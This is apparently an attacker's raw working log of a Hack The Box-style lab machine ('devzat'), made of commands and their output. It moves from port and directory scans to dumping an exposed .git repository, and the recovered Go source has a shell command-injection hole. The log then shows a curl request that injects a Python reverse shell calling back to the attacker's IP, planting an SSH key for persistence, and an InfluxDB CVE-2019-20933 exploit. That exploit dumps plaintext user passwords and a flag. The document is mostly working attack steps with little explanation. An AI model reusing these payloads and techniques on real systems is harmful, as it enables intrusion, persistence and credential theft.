@@ -1,0 +1,738 @@
+sudo nmap -sC -sS -sV 10.10.11.118
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 17:00 CST
+Nmap scan report for 10.10.11.118 (10.10.11.118)
+Host is up (0.085s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://devzat.htb/
+8000/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-Go
+| ssh-hostkey: 
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.91%I=7%D=11/5%Time=6185B7A0%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,C,"SSH-2\.0-Go\r\n");
+Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.18 seconds
+
+patrick@devzat.htb
+
+ ssh -l [username] devzat.htb -p 8000 
+ # Chat over ssh
+
+dirbuster -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://devzat.htb
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+Dir found: /images/ - 200
+File found: /images/logo.svg - 200
+Dir found: /icons/ - 403
+Dir found: /assets/ - 200
+Dir found: /assets/js/ - 200
+File found: /assets/js/jquery.min.js - 200
+File found: /assets/js/jquery.scrollex.min.js - 200
+File found: /assets/js/jquery.scrolly.min.js - 200
+File found: /assets/js/browser.min.js - 200
+File found: /assets/js/breakpoints.min.js - 200
+Dir found: /assets/css/ - 200
+Dir found: /assets/sass/ - 200
+File found: /assets/js/main.js - 200
+File found: /assets/js/util.js - 200
+Dir found: /assets/webfonts/ - 200
+Dir found: /assets/css/images/ - 200
+Dir found: /assets/sass/base/ - 200
+Dir found: /assets/sass/components/ - 200
+Dir found: /assets/sass/layout/ - 200
+File found: /assets/css/fontawesome-all.min.css - 200
+File found: /assets/webfonts/fa-brands-400.eot - 200
+Dir found: /assets/sass/libs/ - 200
+File found: /assets/webfonts/fa-brands-400.ttf - 200
+File found: /assets/webfonts/fa-brands-400.svg - 200
+File found: /assets/css/main.css - 200
+File found: /assets/sass/base/_page.scss - 200
+File found: /assets/sass/components/_actions.scss - 200
+File found: /assets/sass/main.scss - 200
+File found: /assets/sass/base/_reset.scss - 200
+File found: /assets/sass/layout/_footer.scss - 200
+File found: /assets/css/noscript.css - 200
+File found: /assets/sass/components/_box.scss - 200
+File found: /assets/webfonts/fa-brands-400.woff - 200
+File found: /assets/sass/noscript.scss - 200
+File found: /assets/sass/libs/_breakpoints.scss - 200
+File found: /assets/sass/layout/_header.scss - 200
+File found: /assets/sass/base/_typography.scss - 200
+File found: /assets/webfonts/fa-brands-400.woff2 - 200
+File found: /assets/sass/libs/_functions.scss - 200
+File found: /assets/webfonts/fa-regular-400.eot - 200
+File found: /assets/sass/components/_button.scss - 200
+File found: /assets/sass/libs/_html-grid.scss - 200
+File found: /assets/sass/components/_features.scss - 200
+File found: /assets/sass/layout/_main.scss - 200
+File found: /assets/sass/libs/_mixins.scss - 200
+File found: /assets/sass/components/_form.scss - 200
+File found: /assets/sass/layout/_nav.scss - 200
+File found: /assets/webfonts/fa-regular-400.svg - 200
+File found: /assets/sass/components/_icon.scss - 200
+File found: /assets/sass/libs/_vars.scss - 200
+File found: /assets/webfonts/fa-regular-400.ttf - 200
+File found: /assets/sass/layout/_wrapper.scss - 200
+File found: /assets/sass/libs/_vendor.scss - 200
+File found: /assets/webfonts/fa-regular-400.woff - 200
+File found: /assets/sass/components/_icons.scss - 200
+File found: /assets/webfonts/fa-regular-400.woff2 - 200
+File found: /assets/sass/components/_image.scss - 200
+File found: /assets/webfonts/fa-solid-900.eot - 200
+File found: /assets/sass/components/_list.scss - 200
+File found: /assets/webfonts/fa-solid-900.svg - 200
+File found: /assets/sass/components/_row.scss - 200
+File found: /assets/webfonts/fa-solid-900.ttf - 200
+File found: /assets/webfonts/fa-solid-900.woff - 200
+File found: /assets/sass/components/_section.scss - 200
+File found: /assets/webfonts/fa-solid-900.woff2 - 200
+File found: /assets/sass/components/_spotlight.scss - 200
+File found: /assets/sass/components/_statistics.scss - 200
+File found: /assets/sass/components/_table.scss - 200
+
+ssh -l patrick devzat.htb -p 8000
+
+patrick: /help
+[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
+[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
+[SYSTEM] 
+[SYSTEM] Interesting features:
+[SYSTEM] • Many, many commands. Run /commands.
+[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
+[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
+[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
+[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
+[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
+[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
+[SYSTEM] • Emoji replacements! (like on Slack and Discord)
+[SYSTEM] 
+[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
+[SYSTEM] 
+[SYSTEM] Made by Ishan Goel with feature ideas from friends.
+[SYSTEM] Thanks to Caleb Denio for lending his server!
+[SYSTEM] 
+[SYSTEM] For a list of commands runccccccccccccc
+[SYSTEM] ┃ /commands
+
+sublist3r -d devzat.htb
+
+                 ____        _     _ _     _   _____
+                / ___| _   _| |__ | (_)___| |_|___ / _ __
+                \___ \| | | | '_ \| | / __| __| |_ \| '__|
+                 ___) | |_| | |_) | | \__ \ |_ ___) | |
+                |____/ \__,_|_.__/|_|_|___/\__|____/|_|
+
+                # Coded By Ahmed Aboul-Ela - @aboul3la
+    
+[-] Enumerating subdomains now for devzat.htb
+[-] Searching now in Baidu..
+[-] Searching now in Yahoo..
+[-] Searching now in Google..
+[-] Searching now in Bing..
+[-] Searching now in Ask..
+[-] Searching now in Netcraft..
+[-] Searching now in DNSdumpster..
+[-] Searching now in Virustotal..
+[-] Searching now in ThreatCrowd..
+[-] Searching now in SSL Certificates..
+[-] Searching now in PassiveDNS..
+[!] Error: Virustotal probably now is blocking our requests
+
+
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -mc 200
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://devzat.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.devzat.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
+:: Progress: [19966/19966] :: Job [1/1] :: 164 req/sec :: Duration: [0:02:03] :: Errors: 0 ::
+
+dirbuster -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://pets.devzat.htb
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+Dir found: /build/ - 200
+File found: /build/main.js - 200
+File found: /main.js - 200
+File found: /build/main.js.map - 200
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c65715,p65716) contains attribute name with invalid character at position (r2,c65736,p65737)
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c65715,p65716) contains attribute name with invalid character at position (r2,c65737,p65738)
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c65994,p65995) contains attribute name with invalid character at position (r2,c66015,p66016)
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c65994,p65995) contains attribute name with invalid character at position (r2,c66016,p66017)
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c66927,p66928) contains attribute name with invalid character at position (r2,c66948,p66949)
+Nov 05, 2021 6:33:45 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
+INFO: StartTag div at (r2,c66927,p66928) contains attribute name with invalid character at position (r2,c66949,p66950)
+Dir found: /css/ - 200
+Nov 05, 2021 6:34:34 PM org.apache.commons.httpclient.HttpMethodDirector executeWithRetry
+INFO: I/O exception (org.apache.commons.httpclient.NoHttpResponseException) caught when processing request: The server pets.devzat.htb failed to respond
+Nov 05, 2021 6:34:34 PM org.apache.commons.httpclient.HttpMethodDirector executeWithRetry
+INFO: Retrying request
+File found: /css/all.min.css - 200
+File found: /css/global.css - 200
+File found: /css/bootstrap.min.css - 200
+File found: /Main.js - 200
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://pets.devzat.htb/FUZZ -fs 510
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://pets.devzat.htb/FUZZ -fs 510
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://pets.devzat.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 510
+________________________________________________
+
+css                     [Status: 301, Size: 40, Words: 3, Lines: 3]
+build                   [Status: 301, Size: 42, Words: 3, Lines: 3]
+server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
+.git                    [Status: 301, Size: 41, Words: 3, Lines: 3]
+:: Progress: [43003/43003] :: Job [1/1] :: 222 req/sec :: Duration: [0:03:44] :: Errors: 0 ::
+
+wget --recursive --no-parent http://pets.devzat.htb/.git
+
+git diff
+
+wget --recursive --no-parent http://pets.devzat.htb/.git
+
+diff --git a/go.sum b/go.sum
+deleted file mode 100644
+index 5350288..0000000
+--- a/go.sum
++++ /dev/null
+@@ -1,2 +0,0 @@
+-github.com/gorilla/mux v1.8.0 h1:i40aqfkR1h2SlN9hojwV5ZA91wcXFOvkdNIeFDP5koI=
+-github.com/gorilla/mux v1.8.0/go.mod h1:DVbg23sWSpFRCP0SfiEN6jmj59UnW/n46BH5rLB71So=
+diff --git a/main.go b/main.go
+deleted file mode 100644
+index 54f95a5..0000000
+--- a/main.go
++++ /dev/null
+@@ -1,158 +0,0 @@
+-package main
+-
+-import (
+-       "embed"
+-       "encoding/json"
+-       "fmt"
+-       "io/fs"
+-       "io/ioutil"
+-       "log"
+-       "net/http"
+-       "os/exec"
+-       "time"
+
+
+-
+-var (
+-       Pets []Pet = []Pet{
+-               {Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
+-               {Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
+-               {Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
+-               {Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
+-               {Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
+-               {Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
+-               {Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
+-               {Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
+-       }
+-)
+-
+-func loadCharacter(species string) string {
+-       cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
+-       stdoutStderr, err := cmd.CombinedOutput()
+-       if err != nil {
+-               return err.Error()
+
+-       // API routes
+-       apiHandler := http.HandlerFunc(petHandler)
+-       http.Handle("/api/pet", headerMiddleware(apiHandler))
+-       log.Fatal(http.ListenAndServe("127.0.0.1:5000", nil))
+
+-func petHandler(w http.ResponseWriter, r *http.Request) {
+-       // Dispatch by method
+-       if r.Method == http.MethodPost {
+-               addPet(w, r)
+-       } else if r.Method == http.MethodGet {
+-               getPets(w, r)
+-
+-       } else {
+-               http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+-       }
+-       // TODO: Add Update and Delete!
+-       Pets = append(Pets, addPet)
+-
+-       w.WriteHeader(http.StatusOK)
+-       fmt.Fprint(w, "Pet was added successfully")
+-}
+
+-func getPets(w http.ResponseWriter, r *http.Request) {
+-       json.NewEncoder(w).Encode(Pets)
+-}
+-
+-func addPet(w http.ResponseWriter, r *http.Request) {
+-       reqBody, _ := ioutil.ReadAll(r.Body)
+-       var addPet Pet
+-       err := json.Unmarshal(reqBody, &addPet)
+-       if err != nil {
+-               e := fmt.Sprintf("There has been an error: %+v", err)
+-               http.Error(w, e, http.StatusBadRequest)
+-               return
+-       }
+-
+-       addPet.Characteristics = loadCharacter(addPet.Species)
+-       Pets = append(Pets, addPet)
+-
+-       w.WriteHeader(http.StatusOK)
+-       fmt.Fprint(w, "Pet was added successfully")
+-}
+
+-type Pet struct {
+-       Name            string `json:"name"`
+-       Species         string `json:"species"`
+-       Characteristics string `json:"characteristics"`
+-}
+
+
+curl --location --request POST '127.0.0.1:8086/api/pet' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+    "name": "test2",
+    "species": "cat && python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.224\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\''",
+    "characteristics": ""
+}'
+
+
+ncat -lvp 9000
+python3 -c 'import pty;  pty.spawn("/bin/bash")'
+
+patrick@devzat:~$ locate user.txt
+locate user.txt
+/home/catherine/user.txt
+
+echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNm3HJqD/JwYJrmT5RV6JiuLEuMJeUJ2RTdV+42btvcJUF8HpChQpEPUWninyAcfLiC9fXTZLGyo0tJsCokWVq4J7EyP0JLBtCOVqbW3mUJA/yHZWIVO8QiG0iFD+Ae5iKv+WlvofKzdxQ8upvotnHqeORVCVQavREPwOxkQ/rkxAiDiDqNTOKDmWuGq2N3SYzoWlAREhKcn6sOIQE2sEnqusbJIfZ/1h6G9VnAZfP2NNfA5lDbuI4o5KMZpkY74AjzTMeBtCxiVUI3UtC9VtPlqIQ3s6nPKMM5YGmlkxl1/FaC2W50gfIpN+nEsrDXs0AzWFNCsPgZYSNNGNxxZjdcOQdqsoPXfzmom+PDpjur5ZT495lvTsQcAaAgCExjvh2TSQoHwTrDBbZnixyokrZli4Zv0AS7eliGqxFEc/bCM4GNyyg22kNGpPGVABUEzzdJiY/zcQqdqlohpEWUcYET3DQd7rx35+4/bFDkxj+uayM4yH2PVzb9N83zEvY6c0= jd@klso >> authorized_keys
+
+ssh patrick@pets.devzat.htb
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+patrick:x:1000:1000:patrick:/home/patrick:/bin/bash
+catherine:x:1001:1001:catherine,,,:/home/catherine:/bin/bash
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+
+python3 -m http.server 7899
+wget 10.10.14.224:7899/LinEnum.sh
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
+
+ps aux
+root         873  0.0  0.1   6892  2432 ?        Ss   Nov05   0:00 /bin/bash /root/devzat/start.sh
+patrick      874  0.0  0.1   6892  2264 ?        Ss   Nov05   0:00 /bin/bash /home/patrick/devzat/start.sh
+root         877  0.0  0.5 1084508 11392 ?       Sl   Nov05   0:00 ./devchat
+patrick      887  0.0  0.1   6892  2332 ?        Ss   Nov05   0:00 /bin/bash /home/patrick/pets/start.sh
+patrick      899  0.0  0.7 1235044 15568 ?       Sl   Nov05   0:02 ./devchat
+patrick      900  0.0  0.5 1231176 11800 ?       Sl   Nov05   1:04 ./petshop
+root        1000  0.0  4.5 946772 90544 ?        Ssl  Nov05   0:13 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/co
+root        1258  0.0  0.1 549056  3904 ?        Sl   Nov05   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086
+root        1000  0.0  4.5 946772 90544 ?        Ssl  Nov05   0:13 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+
+
+
+ lsof -i -P
+COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+devchat 899 patrick    7u  IPv6  36290      0t0  TCP *:8000 (LISTEN)
+petshop 900 patrick    3u  IPv4  35397      0t0  TCP localhost:5000 (LISTEN)
+
+ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      900/./petshop       
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      899/./devchat       
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -          
+
+
+ssh -l test 127.0.0.1 -p 8443
+
+ssh patrick@pets.devzat.htb -L 8086:127.0.0.1:8086 -N
+
+sudo nmap -p 8086 -sC -sS -sV 127.0.0.1
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 20:22 CST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000044s latency).
+
+PORT     STATE SERVICE VERSION
+8086/tcp open  http    InfluxDB http admin 1.7.5
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
+
+https://www.google.com/search?q=InfluxDB+1.7.5+cve&client=firefox-b-e&ei=P-eFYf3RHMOOwbkPpvSEeA&oq=InfluxDB+1.7.5+cve&gs_lcp=Cgdnd3Mtd2l6EAMyBQghEKABOggIABCABBCwAzoHCAAQsAMQHjoFCAAQgARKBAhBGAFQjwZYnQtgmQ1oAXAAeACAAacCiAGIB5IBBTAuMS4zmAEAoAEByAEEwAEB&sclient=gws-wiz&ved=0ahUKEwi97cCe14L0AhVDRzABHSY6AQ8Q4dUDCA0&uact=5
+
+git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
+
+pip install -r requirements.txt
+python3 __main__.py
+
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+
+python3 __main__.py            
+  _____        __ _            _____  ____    ______            _       _ _   
+ |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
+   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
+   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
+  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
+ |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
+                                                         | |                  
+                                                         |_|                  
+CVE-2019-20933
+
+Insert ip host (default localhost): 127.0.0.1
+Insert port (default 8086): 8086
+Insert influxdb user (wordlist path to bruteforce username): /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+
+Start username bruteforce
+[x] root
+[v] admin
+
+Host vulnerable !!!
+Databases list:
+
+1) devzat
+2) _internal
+
+Insert database name (exit to close): devzat
+[devzat] Insert query (exit to change db): SELECT * FROM users;   
+{
+    "error": "error parsing query: found USERS, expected identifier at line 1, char 15"
+}
+[devzat] Insert query (exit to change db): select * from user;
+{
+    "error": "error parsing query: found USER, expected identifier at line 1, char 15"
+}
+[devzat] Insert query (exit to change db): select * from user
+{
+    "error": "error parsing query: found USER, expected identifier at line 1, char 15"
+}
+[devzat] Insert query (exit to change db): select * from "user"
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "time",
+                        "enabled",
+                        "password",
+                        "username"
+                    ],
+                    "name": "user",
+                    "values": [
+                        [
+                            "2021-06-22T20:04:16.313965493Z",
+                            false,
+                            "WillyWonka2021",
+                            "wilhelm"
+                        ],
+                        [
+                            "2021-06-22T20:04:16.320782034Z",
+                            true,
+                            "woBeeYareedahc7Oogeephies7Aiseci",
+                            "catherine"
+                        ],
+                        [
+                            "2021-06-22T20:04:16.996682002Z",
+                            true,
+                            "RoyalQueenBee$",
+                            "charles"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+[devzat] Insert query (exit to change db): 
+
+su catherine
+
+catherine@devzat:~$ cat user.txt 
+9f3fc73f3f137c27f2318268721ff200
+
+sudo -l
+[sudo] password for catherine: 
+Sorry, user catherine may not run sudo on devzat
+
+./LinEnum.sh -r rep
+wget 10.10.11.118:7899/rep-06-11-21
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
+
+catherine@devzat:/opt$ cd /opt
+catherine@devzat:/opt$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Jun 22 20:01 .
+drwxr-xr-x 20 root root 4096 Sep 29 10:30 ..
+drwx--x--x  4 root root 4096 Jun 22 20:01 containerd
+
+catherine@devzat:/var$ ls -la
+total 56
+drwxr-xr-x 14 root root   4096 Jun 22 18:34 .
+drwxr-xr-x 20 root root   4096 Sep 29 10:30 ..
+drwxr-xr-x  2 root root   4096 Nov  5 06:25 backups
+drwxr-xr-x 15 root root   4096 Jul 16 06:39 cache
+drwxrwxrwt  2 root root   4096 Feb  1  2021 crash
+drwxr-xr-x 43 root root   4096 Sep 28 19:18 lib
+drwxrwsr-x  2 root staff  4096 Apr 15  2020 local
+lrwxrwxrwx  1 root root      9 Feb  1  2021 lock -> /run/lock
+drwxrwxr-x  9 root syslog 4096 Nov  6 00:00 log
+drwxrwsr-x  2 root mail   4096 Jul 16 06:41 mail
+drwxr-xr-x  2 root root   4096 Feb  1  2021 opt
+lrwxrwxrwx  1 root root      4 Feb  1  2021 run -> /run
+drwxr-xr-x  4 root root   4096 Jun 22 19:44 snap
+drwxr-xr-x  4 root root   4096 Jul 16 06:41 spool
+drwxrwxrwt  7 root root   4096 Nov  6 00:00 tmp
+drwxr-xr-x  3 root root   4096 Jun 22 18:34 www
+
+catherine@devzat:/var/opt$ ls -la
+total 8
+drwxr-xr-x  2 root root 4096 Feb  1  2021 .
+drwxr-xr-x 14 root root 4096 Jun 22 18:34 ..
+
+catherine@devzat:/var/log$ ls -la
+total 7256
+drwxrwxr-x   9 root      syslog             4096 Nov  6 00:00 .
+drwxr-xr-x  14 root      root               4096 Jun 22 18:34 ..
+-rw-r--r--   1 root      root                  0 Sep 29 11:48 alternatives.log
+drwxr-x---   2 root      adm                4096 Nov  6 00:00 apache2
+drwxr-xr-x   2 root      root               4096 Oct 11 14:21 apt
+-rw-r-----   1 syslog    adm               27239 Nov  6 02:39 auth.log
+-rw-r-----   1 syslog    adm                2352 Nov  5 05:20 auth.log.1
+-rw-r-----   1 syslog    adm                1006 Oct 11 14:21 auth.log.2.gz
+-rw-r--r--   1 root      root             104003 Feb  1  2021 bootstrap.log
+-rw-rw----   1 root      utmp               1152 Nov  6 02:31 btmp
+-rw-rw----   1 root      utmp                  0 Oct 11 14:21 btmp.1
+-rw-r--r--   1 syslog    adm              818082 Sep 21 19:23 cloud-init.log
+-rw-r-----   1 root      adm               42542 Sep 21 19:23 cloud-init-output.log
+drwxr-xr-x   2 root      root               4096 Jan 19  2021 dist-upgrade
+-rw-r--r--   1 root      adm              126577 Nov  5 05:20 dmesg
+-rw-r--r--   1 root      adm              127736 Oct 11 14:26 dmesg.0
+-rw-r--r--   1 root      adm               24548 Oct 11 14:21 dmesg.1.gz
+-rw-r--r--   1 root      adm               24700 Sep 29 16:25 dmesg.2.gz
+-rw-r--r--   1 root      adm               24747 Sep 29 11:48 dmesg.3.gz
+-rw-r--r--   1 root      adm               24929 Sep 28 19:10 dmesg.4.gz
+-rw-r--r--   1 root      root                  0 Oct 11 14:21 dpkg.log
+-rw-r--r--   1 root      root              13454 Sep 28 18:45 dpkg.log.1
+-rw-r--r--   1 root      root              32064 Jun 22 18:33 faillog
+drwxr-xr-x   3 root      root               4096 Jun 22 18:04 installer
+drwxr-sr-x+  3 root      systemd-journal    4096 Jun 22 18:07 journal
+-rw-r-----   1 syslog    adm                2747 Nov  5 23:01 kern.log
+-rw-r-----   1 syslog    adm              321282 Nov  5 05:20 kern.log.1
+-rw-r-----   1 syslog    adm              100133 Oct 11 14:21 kern.log.2.gz
+drwxr-xr-x   2 landscape landscape          4096 Jun 22 18:08 landscape
+-rw-rw-r--   1 root      utmp             292584 Nov  6 01:38 lastlog
+-rw-r-----   1 syslog    adm                   0 Sep 21 19:22 mail.log
+drwx------   2 root      root               4096 Feb  1  2021 private
+-rw-r-----   1 syslog    adm              661933 Nov  6 02:44 syslog
+-rw-r-----   1 syslog    adm             4541385 Nov  6 00:00 syslog.1
+-rw-r-----   1 syslog    adm               70869 Nov  5 05:20 syslog.2.gz
+-rw-r-----   1 syslog    adm               72831 Oct 11 14:21 syslog.3.gz
+-rw-------   1 root      root                  0 Nov  6 00:00 ubuntu-advantage.log
+-rw-------   1 root      root               1328 Nov  5 15:03 ubuntu-advantage.log.1
